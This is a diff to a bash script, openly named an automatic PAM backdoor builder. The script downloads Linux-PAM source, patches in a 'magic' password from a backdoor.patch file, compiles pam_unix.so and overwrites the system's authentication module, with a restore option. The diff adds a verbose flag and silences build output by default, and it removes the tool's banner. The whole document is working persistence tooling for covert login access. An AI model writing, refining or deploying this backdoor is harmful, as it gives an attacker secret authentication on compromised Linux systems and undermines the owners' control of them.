@@ -4,6 +4,7 @@ OPTIND=1
 PAM_VERSION=""
 PAM_FILE=""
 PASSWORD=""
+VERBOSE=false
 PAM_DEST="/lib/x86_64-linux-gnu/security/pam_unix.so"
 BACKUP_PATH="/lib/x86_64-linux-gnu/security/pam_unix.so.bak"
 
@@ -14,18 +15,23 @@ DEPENDENCIES=(
     pkg-config sed w3m xsltproc xz-utils gcc wget
 )
 
-echo "--------------------------------------"
-echo "   Automatic PAM Backdoor Builder     "
-echo "--------------------------------------"
+function run_cmd {
+    if [ "$VERBOSE" = true ]; then
+        "$@"
+    else
+        "$@" &>/dev/null
+    fi
+}
 
 function show_help {
-    echo "Usage: $0 [-v version] -p password [--restore]"
+    echo "Usage: $0 [-v version] -p password [--restore] [--verbose]"
     echo ""
     echo "Options:"
-    echo "  -v          Specify Linux-PAM version (e.g., 1.3.1)."
-    echo "  -p          The 'magic' password for the backdoor."
-    echo "  --restore   Restore original PAM and offer reboot."
-    echo "  -h, --help  Show help message."
+    echo "  -v           Specify Linux-PAM version (e.g., 1.3.1)."
+    echo "  -p           The 'magic' password for the backdoor."
+    echo "  --restore    Restore original PAM and offer reboot."
+    echo "  --verbose    Show all command output."
+    echo "  -h, --help   Show help message."
 }
 
 function offer_reboot {
@@ -45,11 +51,7 @@ function offer_reboot {
     done
 }
 
-if [[ $EUID -ne 0 ]]; then
-   echo "Error: This script must be run as root."
-   exit 1
-fi
-
+# Check for flags before getopts to catch long options
 for arg in "$@"; do
     if [[ "$arg" == "--restore" ]]; then
         if [ -f "$BACKUP_PATH" ]; then
@@ -61,7 +63,15 @@ for arg in "$@"; do
             exit 1
         fi
     fi
+    if [[ "$arg" == "--verbose" ]]; then
+        VERBOSE=true
+    fi
 done
+
+if [[ $EUID -ne 0 ]]; then
+   echo "Error: This script must be run as root."
+   exit 1
+fi
 
 function check_dependencies {
     echo "Checking dependencies..."
@@ -73,7 +83,8 @@ function check_dependencies {
     done
 
     if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
-        apt update && apt install -y "${MISSING_PKGS[@]}"
+        run_cmd apt update 
+        run_cmd apt install -y "${MISSING_PKGS[@]}"
     fi
 }
 
@@ -101,20 +112,23 @@ PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
 PAM_FILE="v${PAM_VERSION}.tar.gz"
 PAM_DIR="linux-pam-${PAM_VERSION}"
 
-wget -c "${PAM_BASE_URL}/${PAM_FILE}" || { echo "Download failed"; exit 1; }
-tar xzf "$PAM_FILE"
+echo "Downloading PAM source..."
+run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}" || { echo "Download failed"; exit 1; }
+run_cmd tar xzf "$PAM_FILE"
 
+echo "Applying patch..."
 if [ -f "backdoor.patch" ]; then
-    sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR"
+    sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR" &>/dev/null
 else
     echo "Error: backdoor.patch missing."
     exit 1
 fi
 
 cd "$PAM_DIR"
-if [[ ! -f "./configure" ]]; then ./autogen.sh; fi 
-./configure --libdir=/lib/x86_64-linux-gnu
-make
+echo "Configuring and compiling (this may take a moment)..."
+if [[ ! -f "./configure" ]]; then run_cmd ./autogen.sh; fi 
+run_cmd ./configure --libdir=/lib/x86_64-linux-gnu
+run_cmd make
 
 if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
     cp modules/pam_unix/.libs/pam_unix.so ../pam_unix.so
@@ -128,6 +142,6 @@ if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
     
     offer_reboot
 else
-    echo "Error: Build failed."
+    echo "Error: Build failed. Run with --verbose to see errors."
     exit 1
 fi
